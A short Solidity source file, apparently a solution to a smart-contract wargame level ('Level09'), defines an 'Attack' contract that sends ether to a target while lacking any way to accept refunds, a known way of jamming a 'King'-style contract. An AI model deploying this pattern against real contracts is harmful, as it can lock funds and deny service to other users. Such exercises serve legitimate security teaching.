// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level09.sol";

contract Attack {
    function attackKing(address payable _addr) public payable returns (bool success) {
        (success,) = _addr.call{value: msg.value}("");
    }
}
